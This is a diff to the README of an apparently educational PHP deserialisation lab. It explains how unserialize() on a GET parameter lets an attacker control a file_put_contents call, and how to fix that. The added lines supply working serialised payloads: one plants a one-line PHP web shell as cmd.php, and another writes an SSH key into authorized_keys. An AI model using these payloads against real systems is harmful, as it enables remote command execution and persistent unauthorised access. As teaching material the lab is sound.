@@ -12,7 +12,7 @@ This represents a simple web application that constructs a `SignupForm` object a
 
 The class variables `$outfile` and `$username_string` are normally set by the `parse_username()` method. However, when a specially crafted `SignupForm` object with these variables already set is passed to the `username` GET parameter, it is deserialised and the `__destruct` method is automatically called. This skips the `parse_username()` method and overrides the variables, meaning their attacker-controlled values are used in the `file_put_contents` call.
 
-The vulnerability only exists because untrusted data (i.e. user input) is passed directly to the `unserialize()` function. Remove this line, and the vulnerability is fixed. In fact, it's not even needed to make this program work - it is there just to teach about the mechanics of the vulnerability, but there may be situations where `unserialize()` may have a genuine use case (for example, if objects were seralized for more efficient storage). In this case, ensure that no untrusted data is allowed into the source of this deserialisation.
+The vulnerability only exists because untrusted data (i.e. user input) is passed directly to the `unserialize()` function. Remove this line, and the vulnerability is fixed. In fact, it's not even needed to make this program work - it is there just to teach about the mechanics of the vulnerability, but there may be situations where `unserialize()` may have a genuine use case (for example, if objects were serialized for more efficient storage). In this case, ensure that no untrusted data is allowed into the source of this deserialisation.
 
 ## generate-object.php
 
@@ -48,13 +48,15 @@ Then make a request to the page, passing your object to the `username` GET param
 
 `localhost:5000/unsafe.php?username={SERIALISED OBJECT HERE}`
 
-*Note:* If you use curl, bash may throw a fit at your curly brackets. It's easier to visit the URL in your browser instead
+*Note:* If you use curl, bash may throw a fit at your curly brackets. It's easier to visit the URL in your browser instead.
 
 For example:
 
 `localhost:5000/unsafe.php?username=O:10:"SignupForm":2:{s:7:"outfile";s:10:"gotcha.txt";s:15:"username_string";s:25:"malicious stuff goes here";}`
 
 The `gotcha.txt` file should now appear in the webserver directory!
+
+*Another Note:* Remember, anything you put in your payload happens on *your* machine - if someone monitors your installation directory for naughty `.txt` files and you write something you shouldn't have, don't come crying to us.
 
 ## Exploit Payloads
 
@@ -64,9 +66,19 @@ Our example exploit writes something fairly harmless to `gotcha.txt`, demonstrat
 
 This won't necessarily allow you to escalate priveleges, but it lets you perform more actions on the box besides writing to files. You will have the permissions of the user who is running the web server (don't run your web servers as root!)
 
+Here's the serialised object for a cheeky one-line PHP shell:
+
+`O:10:"SignupForm":2:{s:7:"outfile";s:7:"cmd.php";s:15:"username_string";s:29:"<?php system($_GET['cmd']);?>";}`
+
+If you're editing the `$username_string` variable here, you may need to escape the `$` character as follows: `public $username_string = "<?php system(\$_GET['cmd']);?>";`
+
 ### Write an SSH key
 
 The file location is limited by the `__DIR__` prefix. However, if for some ungodly reason this webserver was hosted in a user's home directory, a payload such as the following could write an SSH key to the `.ssh/authorized_keys` file. Like the above, this doesn't escalate your priveleges but allows you a more interactive shell
+
+`O:10:"SignupForm":2:{s:7:"outfile";s:20:".ssh/authorized_keys";s:15:"username_string";s:20:"YOUR ID_RSA.pub HERE";}`
+
+I shouldn't have to say this, but "YOUR ID_RSA.pub HERE" is not a valid SSH key. If you want this to work, make sure to replace it (ideally in the `generate-object.php` file itself, so it calculates the length for you)
 
 ## Acknowledgements
 
